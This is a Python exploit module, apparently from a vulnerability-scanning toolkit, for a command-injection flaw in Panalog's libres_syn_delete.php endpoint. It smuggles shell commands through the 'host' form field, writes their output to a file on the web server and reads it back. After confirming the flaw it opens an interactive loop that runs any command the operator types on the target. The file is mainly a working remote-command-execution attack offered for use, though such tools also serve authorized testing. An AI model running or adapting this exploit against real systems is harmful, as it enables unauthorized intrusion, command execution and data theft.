#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib3
import string, random
from urllib.parse import urljoin
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class Panalog_Rce_Scan:
    def generate_random_string(self,length):
        characters = string.ascii_letters + string.digits
        random_string = ''.join(random.choice(characters) for _ in range(length))
        return random_string

    def check(self,url):
        url = url.rstrip("/")
        target_url = urljoin(url, "/content-apply/libres_syn_delete.php")
        headers = {
            "User-Agent": self.headers["User-Agent"],
            "Content-Type": "application/x-www-form-urlencoded"
        }
        random_str = self.generate_random_string(10)
        data = "token=1&id=2&host=|echo%20{} >madwd1o190kdj".format(random_str)
        try:
            response = requests.post(target_url, verify=self.ssl,proxies=self.proxy, headers=headers, data=data, timeout=15)
            if response.status_code == 200 and 'OK' in response.text:
                result_url = urljoin(url, '/content-apply/madwd1o190kdj')
                result_response = requests.get(result_url, headers=headers, verify=self.ssl,proxies=self.proxy, timeout=15)
                if result_response.status_code == 200 and random_str in result_response.text:
                    OutPrintInfoSuc("Panalog", f'目标存在Panalog_libres_syn_delete_RCE漏洞: {url}')
                    if self.batch:
                        OutPutFile("panalog_libres_syn_delete_rce.txt", f'目标存在Panalog_libres_syn_delete_RCE漏洞: {url}')
                    return True
                else:
                    if not self.batch:
                        OutPrintInfo("Panalog", f'目标不存在Panalog_libres_syn_delete_RCE漏洞')
            else:
                if not self.batch:
                    OutPrintInfo("Panalog", f'目标不存在Panalog_libres_syn_delete_RCE漏洞')
        except Exception as e:
            pass

    def run(self,url):
        url = url.rstrip("/")
        target = urljoin(url, "/content-apply/libres_syn_delete.php")
        headers = {
            "User-Agent": self.headers["User-Agent"],
            "Content-Type": "application/x-www-form-urlencoded"
        }
        if self.check(url):
            while True:
                command = input("\033[34mPlease input command (stop input:exit):\033[0m")
                if "exit" not in command:
                    data = "token=1&id=2&host=|{} >madwd1o190kdj".format(command)
                    try:
                        response = requests.post(target, verify=self.ssl,proxies=self.proxy, headers=headers, data=data, timeout=15)
                        if response.status_code == 200 and 'OK' in response.text:
                            result_url = urljoin(url, '/content-apply/madwd1o190kdj')
                            result_response = requests.get(result_url, headers=headers, verify=self.ssl,proxies=self.proxy, timeout=15)
                            if result_response.status_code == 200:
                                OutPrintInfoSuc("Panalog",f"响应:\n{result_response.text.strip()}")
                    except Exception as e:
                        OutPrintInfo("Panalog", f'目标请求出错')
                        pass
                else:
                    break

    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Panalog", '开始检测Panalog_libres_syn_delete_RCE漏洞...')
        if self.check(url):
            if not self.batch:
                self.run(url)
        if not self.batch:
            OutPrintInfo("Panalog", 'Panalog_libres_syn_delete_RCE漏洞检测结束')

